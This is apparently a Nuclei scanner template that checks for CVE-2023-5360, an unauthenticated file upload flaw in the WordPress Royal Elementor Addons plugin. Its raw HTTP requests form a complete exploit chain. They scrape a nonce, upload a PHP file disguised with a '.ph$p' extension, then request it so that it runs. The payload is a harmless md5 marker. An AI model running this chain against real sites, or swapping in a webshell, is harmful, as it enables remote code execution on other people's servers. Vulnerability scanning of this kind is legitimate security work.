http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body_1
    regex:
    - WprConfig\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]*)"
    type: regex
  - group: 1
    internal: true
    name: filename
    part: body_2
    regex:
    - wp-content\\\/uploads\\\/wpr-addons\\\/forms\\\/(.*?).php
    type: regex
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - 86398d3a90432d24901a7bbdcf1ab2ba
  - part: header_3
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/admin-ajax.php?action=wpr_addons_upload_file HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------318949277012917151102295043236


    -----------------------------318949277012917151102295043236

    Content-Disposition: form-data; name="uploaded_file"; filename="{{file}}.ph$p"

    Content-Type: image/png


    <?php echo md5("CVE-2023-5360");?>

    -----------------------------318949277012917151102295043236

    Content-Disposition: form-data; name="allowed_file_types"


    ph$p

    -----------------------------318949277012917151102295043236

    Content-Disposition: form-data; name="triggering_event"


    click

    -----------------------------318949277012917151102295043236

    Content-Disposition: form-data; name="wpr_addons_nonce"


    {{nonce}}

    -----------------------------318949277012917151102295043236--

    '
  - 'GET /wp-content/uploads/wpr-addons/forms/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-5360
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:royal-elementor-addons:royal_elementor_addons:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-5360
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.99589
    epss-score: 0.96723
  description: 'Arbitrary File Upload vulnerability in WordPress Royal Elementor Addons
    Plugin. This could allow a malicious actor to upload any type of file to your
    website. This can include backdoors which are then executed to gain further access
    to your website. This vulnerability has been fixed in version 1.3.79

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: royal_elementor_addons
    publicwww-query: /plugins/royal-elementor-addons/
    vendor: royal-elementor-addons
    verified: 'true'
  name: WordPress Royal Elementor Addons Plugin <= 1.3.78 - Arbitrary File Upload
  reference:
  - https://wordpress.org/plugins/royal-elementor-addons/
  - https://wpscan.com/vulnerability/281518ff-7816-4007-b712-63aed7828b34/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5360
  - https://wpscan.com/vulnerability/281518ff-7816-4007-b712-63aed7828b34
  - http://packetstormsecurity.com/files/175992/WordPress-Royal-Elementor-Addons-And-Templates-Remote-Shell-Upload.html
  remediation: Fixed in 1.3.79
  severity: critical
  tags: wpscan,packetstorm,cve,cve2023,rce,wordpress,wp-plugin,wp,royal-elementor-addons,unauth,intrusive
variables:
  file: '{{to_lower(rand_text_alpha(5))}}'
